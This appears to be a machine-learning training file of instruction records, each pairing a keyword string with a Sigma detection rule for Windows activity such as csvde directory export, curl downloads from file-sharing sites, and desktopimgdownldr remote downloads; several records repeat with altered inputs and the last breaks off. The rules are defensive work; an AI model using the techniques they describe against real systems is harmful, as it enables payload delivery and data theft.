{"instruction": "Write Sigma rule to detect payload:", "input": "\\csvde.exe -f csvde.exe -i", "output": "title: Active Directory Structure Export Via Csvde.EXE\nid: e5d36acd-acb4-4c6f-a13f-9eb203d50099\nstatus: test\ndescription: Detects the execution of \"csvde.exe\" in order to export organizational Active Directory structure.\nreferences:\n    - https://www.cybereason.com/blog/research/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firms\n    - https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\n    - https://businessinsights.bitdefender.com/deep-dive-into-a-backdoordiplomacy-attack-a-study-of-an-attackers-toolkit\n    - https://redcanary.com/blog/msix-installers/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.exfiltration\n    - attack.discovery\n    - attack.t1087.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\csvde.exe'\n        - OriginalFileName: 'csvde.exe'\n    selection_remote:\n        CommandLine|contains: ' -f'\n    filter_import:\n        CommandLine|contains: ' -i'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl.exe curl.exe .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net pixeldrain.com privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev http -O --remote-name --output", "output": "title: Suspicious File Download From File Sharing Domain Via Curl.EXE\nid: 56454143-524f-49fb-b1c6-3fb8b1ad41fb\nstatus: experimental\ndescription: Detects potentially suspicious file download from file sharing domains using curl.exe\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\n    - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-05\nmodified: 2024-10-21\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_websites:\n        CommandLine|contains:\n            - '.githubusercontent.com'       # Includes both gists and github repositories / Michael Haag (idea)\n            - 'anonfiles.com'\n            - 'cdn.discordapp.com'\n            - 'ddns.net'\n            - 'dl.dropboxusercontent.com'\n            - 'ghostbin.co'\n            - 'glitch.me'\n            - 'gofile.io'\n            - 'hastebin.com'\n            - 'mediafire.com'\n            - 'mega.nz'\n            - 'onrender.com'\n            - 'pages.dev'\n            - 'paste.ee'\n            - 'pastebin.com'\n            - 'pastebin.pl'\n            - 'pastetext.net'\n            - 'pixeldrain.com'\n            - 'privatlab.com'\n            - 'privatlab.net'\n            - 'send.exploit.in'\n            - 'sendspace.com'\n            - 'storage.googleapis.com'\n            - 'storjshare.io'\n            - 'supabase.co'\n            - 'temp.sh'\n            - 'transfer.sh'\n            - 'trycloudflare.com'\n            - 'ufile.io'\n            - 'w3spaces.com'\n            - 'workers.dev'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_flag:\n        CommandLine|contains:\n            - ' -O'  # covers the alias for --remote-name and --output\n            - '--remote-name'\n            - '--output'\n    selection_ext:\n        CommandLine|endswith:\n            - \".ps1\"\n            - \".ps1'\"\n            - '.ps1\"'\n            - \".dat\"\n            - \".dat'\"\n            - '.dat\"'\n            - \".msi\"\n            - \".msi'\"\n            - '.msi\"'\n            - \".bat\"\n            - \".bat'\"\n            - '.bat\"'\n            - \".exe\"\n            - \".exe'\"\n            - '.exe\"'\n            - \".vbs\"\n            - \".vbs'\"\n            - '.vbs\"'\n            - \".vbe\"\n            - \".vbe'\"\n            - '.vbe\"'\n            - \".hta\"\n            - \".hta'\"\n            - '.hta\"'\n            - \".dll\"\n            - \".dll'\"\n            - '.dll\"'\n            - \".psm1\"\n            - \".psm1'\"\n            - '.psm1\"'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl.exe curl.exe .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net pixeldrain.com privat\"lab.com\" privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev http -O --remote-name --output", "output": "title: Suspicious File Download From File Sharing Domain Via Curl.EXE\nid: 56454143-524f-49fb-b1c6-3fb8b1ad41fb\nstatus: experimental\ndescription: Detects potentially suspicious file download from file sharing domains using curl.exe\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\n    - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-05\nmodified: 2024-10-21\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_websites:\n        CommandLine|contains:\n            - '.githubusercontent.com'       # Includes both gists and github repositories / Michael Haag (idea)\n            - 'anonfiles.com'\n            - 'cdn.discordapp.com'\n            - 'ddns.net'\n            - 'dl.dropboxusercontent.com'\n            - 'ghostbin.co'\n            - 'glitch.me'\n            - 'gofile.io'\n            - 'hastebin.com'\n            - 'mediafire.com'\n            - 'mega.nz'\n            - 'onrender.com'\n            - 'pages.dev'\n            - 'paste.ee'\n            - 'pastebin.com'\n            - 'pastebin.pl'\n            - 'pastetext.net'\n            - 'pixeldrain.com'\n            - 'privatlab.com'\n            - 'privatlab.net'\n            - 'send.exploit.in'\n            - 'sendspace.com'\n            - 'storage.googleapis.com'\n            - 'storjshare.io'\n            - 'supabase.co'\n            - 'temp.sh'\n            - 'transfer.sh'\n            - 'trycloudflare.com'\n            - 'ufile.io'\n            - 'w3spaces.com'\n            - 'workers.dev'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_flag:\n        CommandLine|contains:\n            - ' -O'  # covers the alias for --remote-name and --output\n            - '--remote-name'\n            - '--output'\n    selection_ext:\n        CommandLine|endswith:\n            - \".ps1\"\n            - \".ps1'\"\n            - '.ps1\"'\n            - \".dat\"\n            - \".dat'\"\n            - '.dat\"'\n            - \".msi\"\n            - \".msi'\"\n            - '.msi\"'\n            - \".bat\"\n            - \".bat'\"\n            - '.bat\"'\n            - \".exe\"\n            - \".exe'\"\n            - '.exe\"'\n            - \".vbs\"\n            - \".vbs'\"\n            - '.vbs\"'\n            - \".vbe\"\n            - \".vbe'\"\n            - '.vbe\"'\n            - \".hta\"\n            - \".hta'\"\n            - '.hta\"'\n            - \".dll\"\n            - \".dll'\"\n            - '.dll\"'\n            - \".psm1\"\n            - \".psm1'\"\n            - '.psm1\"'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl.exe curl.exe .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net pixeldrain.com privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev http --remote-name --remote-name --output", "output": "title: Suspicious File Download From File Sharing Domain Via Curl.EXE\nid: 56454143-524f-49fb-b1c6-3fb8b1ad41fb\nstatus: experimental\ndescription: Detects potentially suspicious file download from file sharing domains using curl.exe\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\n    - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-05\nmodified: 2024-10-21\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_websites:\n        CommandLine|contains:\n            - '.githubusercontent.com'       # Includes both gists and github repositories / Michael Haag (idea)\n            - 'anonfiles.com'\n            - 'cdn.discordapp.com'\n            - 'ddns.net'\n            - 'dl.dropboxusercontent.com'\n            - 'ghostbin.co'\n            - 'glitch.me'\n            - 'gofile.io'\n            - 'hastebin.com'\n            - 'mediafire.com'\n            - 'mega.nz'\n            - 'onrender.com'\n            - 'pages.dev'\n            - 'paste.ee'\n            - 'pastebin.com'\n            - 'pastebin.pl'\n            - 'pastetext.net'\n            - 'pixeldrain.com'\n            - 'privatlab.com'\n            - 'privatlab.net'\n            - 'send.exploit.in'\n            - 'sendspace.com'\n            - 'storage.googleapis.com'\n            - 'storjshare.io'\n            - 'supabase.co'\n            - 'temp.sh'\n            - 'transfer.sh'\n            - 'trycloudflare.com'\n            - 'ufile.io'\n            - 'w3spaces.com'\n            - 'workers.dev'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_flag:\n        CommandLine|contains:\n            - ' -O'  # covers the alias for --remote-name and --output\n            - '--remote-name'\n            - '--output'\n    selection_ext:\n        CommandLine|endswith:\n            - \".ps1\"\n            - \".ps1'\"\n            - '.ps1\"'\n            - \".dat\"\n            - \".dat'\"\n            - '.dat\"'\n            - \".msi\"\n            - \".msi'\"\n            - '.msi\"'\n            - \".bat\"\n            - \".bat'\"\n            - '.bat\"'\n            - \".exe\"\n            - \".exe'\"\n            - '.exe\"'\n            - \".vbs\"\n            - \".vbs'\"\n            - '.vbs\"'\n            - \".vbe\"\n            - \".vbe'\"\n            - '.vbe\"'\n            - \".hta\"\n            - \".hta'\"\n            - '.hta\"'\n            - \".dll\"\n            - \".dll'\"\n            - '.dll\"'\n            - \".psm1\"\n            - \".psm1'\"\n            - '.psm1\"'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl curl .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net pixeldrain.com privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev http -O --remote-name --output", "output": "title: Suspicious File Download From File Sharing Domain Via Curl.EXE\nid: 56454143-524f-49fb-b1c6-3fb8b1ad41fb\nstatus: experimental\ndescription: Detects potentially suspicious file download from file sharing domains using curl.exe\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\n    - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-05\nmodified: 2024-10-21\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_websites:\n        CommandLine|contains:\n            - '.githubusercontent.com'       # Includes both gists and github repositories / Michael Haag (idea)\n            - 'anonfiles.com'\n            - 'cdn.discordapp.com'\n            - 'ddns.net'\n            - 'dl.dropboxusercontent.com'\n            - 'ghostbin.co'\n            - 'glitch.me'\n            - 'gofile.io'\n            - 'hastebin.com'\n            - 'mediafire.com'\n            - 'mega.nz'\n            - 'onrender.com'\n            - 'pages.dev'\n            - 'paste.ee'\n            - 'pastebin.com'\n            - 'pastebin.pl'\n            - 'pastetext.net'\n            - 'pixeldrain.com'\n            - 'privatlab.com'\n            - 'privatlab.net'\n            - 'send.exploit.in'\n            - 'sendspace.com'\n            - 'storage.googleapis.com'\n            - 'storjshare.io'\n            - 'supabase.co'\n            - 'temp.sh'\n            - 'transfer.sh'\n            - 'trycloudflare.com'\n            - 'ufile.io'\n            - 'w3spaces.com'\n            - 'workers.dev'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_flag:\n        CommandLine|contains:\n            - ' -O'  # covers the alias for --remote-name and --output\n            - '--remote-name'\n            - '--output'\n    selection_ext:\n        CommandLine|endswith:\n            - \".ps1\"\n            - \".ps1'\"\n            - '.ps1\"'\n            - \".dat\"\n            - \".dat'\"\n            - '.dat\"'\n            - \".msi\"\n            - \".msi'\"\n            - '.msi\"'\n            - \".bat\"\n            - \".bat'\"\n            - '.bat\"'\n            - \".exe\"\n            - \".exe'\"\n            - '.exe\"'\n            - \".vbs\"\n            - \".vbs'\"\n            - '.vbs\"'\n            - \".vbe\"\n            - \".vbe'\"\n            - '.vbe\"'\n            - \".hta\"\n            - \".hta'\"\n            - '.hta\"'\n            - \".dll\"\n            - \".dll'\"\n            - '.dll\"'\n            - \".psm1\"\n            - \".psm1'\"\n            - '.psm1\"'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl.exe curl.exe .githubusercontent.com anonfiles.com cdn.discordapp.com ddns.net dl.dropboxusercontent.com ghostbin.co glitch.me gofile.io hastebin.com mediafire.com mega.nz onrender.com pages.dev paste.ee pastebin.com pastebin.pl pastetext.net pixeldrain.com privatlab.com privatlab.net send.exploit.in sendspace.com storage.googleapis.com storjshare.io supabase.co temp.sh transfer.sh trycloudflare.com ufile.io w3spaces.com workers.dev http -O --remote-name --output", "output": "title: Suspicious File Download From File Sharing Domain Via Curl.EXE\nid: 56454143-524f-49fb-b1c6-3fb8b1ad41fb\nstatus: experimental\ndescription: Detects potentially suspicious file download from file sharing domains using curl.exe\nreferences:\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\n    - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-05\nmodified: 2024-10-21\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_websites:\n        CommandLine|contains:\n            - '.githubusercontent.com'       # Includes both gists and github repositories / Michael Haag (idea)\n            - 'anonfiles.com'\n            - 'cdn.discordapp.com'\n            - 'ddns.net'\n            - 'dl.dropboxusercontent.com'\n            - 'ghostbin.co'\n            - 'glitch.me'\n            - 'gofile.io'\n            - 'hastebin.com'\n            - 'mediafire.com'\n            - 'mega.nz'\n            - 'onrender.com'\n            - 'pages.dev'\n            - 'paste.ee'\n            - 'pastebin.com'\n            - 'pastebin.pl'\n            - 'pastetext.net'\n            - 'pixeldrain.com'\n            - 'privatlab.com'\n            - 'privatlab.net'\n            - 'send.exploit.in'\n            - 'sendspace.com'\n            - 'storage.googleapis.com'\n            - 'storjshare.io'\n            - 'supabase.co'\n            - 'temp.sh'\n            - 'transfer.sh'\n            - 'trycloudflare.com'\n            - 'ufile.io'\n            - 'w3spaces.com'\n            - 'workers.dev'\n    selection_http:\n        CommandLine|contains: 'http'\n    selection_flag:\n        CommandLine|contains:\n            - ' -O'  # covers the alias for --remote-name and --output\n            - '--remote-name'\n            - '--output'\n    selection_ext:\n        CommandLine|endswith:\n            - \".ps1\"\n            - \".ps1'\"\n            - '.ps1\"'\n            - \".dat\"\n            - \".dat'\"\n            - '.dat\"'\n            - \".msi\"\n            - \".msi'\"\n            - '.msi\"'\n            - \".bat\"\n            - \".bat'\"\n            - '.bat\"'\n            - \".exe\"\n            - \".exe'\"\n            - '.exe\"'\n            - \".vbs\"\n            - \".vbs'\"\n            - '.vbs\"'\n            - \".vbe\"\n            - \".vbe'\"\n            - '.vbe\"'\n            - \".hta\"\n            - \".hta'\"\n            - '.hta\"'\n            - \".dll\"\n            - \".dll'\"\n            - '.dll\"'\n            - \".psm1\"\n            - \".psm1'\"\n            - '.psm1\"'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl.exe curl.exe --doh-insecure --proxy-insecure", "output": "title: Insecure Proxy/DOH Transfer Via Curl.EXE\nid: 2c1486f5-02e8-4f86-9099-b97f2da4ed77\nstatus: test\ndescription: Detects execution of \"curl.exe\" with the \"insecure\" flag over proxy or DOH.\nreferences:\n    - https://curl.se/docs/manpage.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-07-27\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '--doh-insecure'\n            - '--proxy-insecure'\n    condition: all of selection_*\nfalsepositives:\n    - Access to badly maintained internal or development systems\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl.exe curl.exe \"--doh-insecure\" \"--proxy-insecure\"", "output": "title: Insecure Proxy/DOH Transfer Via Curl.EXE\nid: 2c1486f5-02e8-4f86-9099-b97f2da4ed77\nstatus: test\ndescription: Detects execution of \"curl.exe\" with the \"insecure\" flag over proxy or DOH.\nreferences:\n    - https://curl.se/docs/manpage.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-07-27\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '--doh-insecure'\n            - '--proxy-insecure'\n    condition: all of selection_*\nfalsepositives:\n    - Access to badly maintained internal or development systems\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl curl --doh-insecure --proxy-insecure", "output": "title: Insecure Proxy/DOH Transfer Via Curl.EXE\nid: 2c1486f5-02e8-4f86-9099-b97f2da4ed77\nstatus: test\ndescription: Detects execution of \"curl.exe\" with the \"insecure\" flag over proxy or DOH.\nreferences:\n    - https://curl.se/docs/manpage.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-07-27\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '--doh-insecure'\n            - '--proxy-insecure'\n    condition: all of selection_*\nfalsepositives:\n    - Access to badly maintained internal or development systems\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl.exe --proxy-insecure --doh-insecure curl.exe", "output": "title: Insecure Proxy/DOH Transfer Via Curl.EXE\nid: 2c1486f5-02e8-4f86-9099-b97f2da4ed77\nstatus: test\ndescription: Detects execution of \"curl.exe\" with the \"insecure\" flag over proxy or DOH.\nreferences:\n    - https://curl.se/docs/manpage.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-07-27\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '--doh-insecure'\n            - '--proxy-insecure'\n    condition: all of selection_*\nfalsepositives:\n    - Access to badly maintained internal or development systems\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl.exe curl.exe file:///", "output": "title: Local File Read Using Curl.EXE\nid: aa6f6ea6-0676-40dd-b510-6e46f02d8867\nstatus: test\ndescription: Detects execution of \"curl.exe\" with the \"file://\" protocol handler in order to read local files.\nreferences:\n    - https://curl.se/docs/manpage.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-07-27\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_cli:\n        CommandLine|contains: 'file:///'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl.exe curl\\\".exe\\\" file:///", "output": "title: Local File Read Using Curl.EXE\nid: aa6f6ea6-0676-40dd-b510-6e46f02d8867\nstatus: test\ndescription: Detects execution of \"curl.exe\" with the \"file://\" protocol handler in order to read local files.\nreferences:\n    - https://curl.se/docs/manpage.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-07-27\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_cli:\n        CommandLine|contains: 'file:///'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl curl file:///", "output": "title: Local File Read Using Curl.EXE\nid: aa6f6ea6-0676-40dd-b510-6e46f02d8867\nstatus: test\ndescription: Detects execution of \"curl.exe\" with the \"file://\" protocol handler in order to read local files.\nreferences:\n    - https://curl.se/docs/manpage.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-07-27\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_cli:\n        CommandLine|contains: 'file:///'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\curl.exe curl.exe file:///", "output": "title: Local File Read Using Curl.EXE\nid: aa6f6ea6-0676-40dd-b510-6e46f02d8867\nstatus: test\ndescription: Detects execution of \"curl.exe\" with the \"file://\" protocol handler in order to read local files.\nreferences:\n    - https://curl.se/docs/manpage.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-07-27\ntags:\n    - attack.execution\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\curl.exe'\n        - OriginalFileName: 'curl.exe'\n    selection_cli:\n        CommandLine|contains: 'file:///'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\desktopimgdownldr.exe \\desktopimgdownldr.exe /lockscreenurl:http", "output": "title: Remote File Download Via Desktopimgdownldr Utility\nid: 214641c2-c579-4ecb-8427-0cf19df6842e\nstatus: test\ndescription: Detects the desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/remote-file-download-via-desktopimgdownldr-utility.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\desktopimgdownldr.exe'\n        ParentImage|endswith: '\\desktopimgdownldr.exe'\n        CommandLine|contains: '/lockscreenurl:http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\desktopimgdownldr.exe \\\"\\desktopimg\\\"downldr.exe /lockscreenurl:http", "output": "title: Remote File Download Via Desktopimgdownldr Utility\nid: 214641c2-c579-4ecb-8427-0cf19df6842e\nstatus: test\ndescription: Detects the desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/remote-file-download-via-desktopimgdownldr-utility.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\desktopimgdownldr.exe'\n        ParentImage|endswith: '\\desktopimgdownldr.exe'\n        CommandLine|contains: '/lockscreenurl:http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\desktopimgdownldr \\desktopimgdownldr /lockscreenurl:http", "output": "title: Remote File Download Via Desktopimgdownldr Utility\nid: 214641c2-c579-4ecb-8427-0cf19df6842e\nstatus: test\ndescription: Detects the desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/remote-file-download-via-desktopimgdownldr-utility.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\desktopimgdownldr.exe'\n        ParentImage|endswith: '\\desktopimgdownldr.exe'\n        CommandLine|contains: '/lockscreenurl:http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\desktopimgdownldr.exe \\desktopimgdownldr.exe /lockscreenurl:http", "output": "title: Remote File Download Via Desktopimgdownldr Utility\nid: 214641c2-c579-4ecb-8427-0cf19df6842e\nstatus: test\ndescription: Detects the desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/remote-file-download-via-desktopimgdownldr-utility.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\desktopimgdownldr.exe'\n        ParentImage|endswith: '\\desktopimgdownldr.exe'\n        CommandLine|contains: '/lockscreenurl:http'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/lockscreenurl: .jpg .jpeg .png reg delete \\PersonalizationCSP", "output": "title: Suspicious Desktopimgdownldr Command\nid: bb58aa4a-b80b-415a-a2c0-2f65a4c81009\nstatus: test\ndescription: Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet\nreferences:\n    - https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n    - https://twitter.com/SBousseaden/status/1278977301745741825\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-07-03\nmodified: 2021-11-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: ' /lockscreenurl:'\n    selection1_filter:\n        CommandLine|contains:\n            - '.jpg'\n            - '.jpeg'\n            - '.png'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'reg delete'\n            - '\\PersonalizationCSP'\n    condition: ( selection1 and not selection1_filter ) or selection_reg\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/lockscreenurl: .jpg .jpeg .p\"ng\" reg delete \\PersonalizationCSP", "output": "title: Suspicious Desktopimgdownldr Command\nid: bb58aa4a-b80b-415a-a2c0-2f65a4c81009\nstatus: test\ndescription: Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet\nreferences:\n    - https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n    - https://twitter.com/SBousseaden/status/1278977301745741825\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-07-03\nmodified: 2021-11-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: ' /lockscreenurl:'\n    selection1_filter:\n        CommandLine|contains:\n            - '.jpg'\n            - '.jpeg'\n            - '.png'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'reg delete'\n            - '\\PersonalizationCSP'\n    condition: ( selection1 and not selection1_filter ) or selection_reg\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/lockscreenurl: .jpg .jpeg .png reg delete \\PersonalizationCSP", "output": "title: Suspicious Desktopimgdownldr Command\nid: bb58aa4a-b80b-415a-a2c0-2f65a4c81009\nstatus: test\ndescription: Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet\nreferences:\n    - https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n    - https://twitter.com/SBousseaden/status/1278977301745741825\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-07-03\nmodified: 2021-11-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains: ' /lockscreenurl:'\n    selection1_filter:\n        CommandLine|contains:\n            - '.jpg'\n            - '.jpeg'\n            - '.png'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'reg delete'\n            - '\\PersonalizationCSP'\n    condition: ( selection1 and not selection1_filter ) or selection_reg\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored 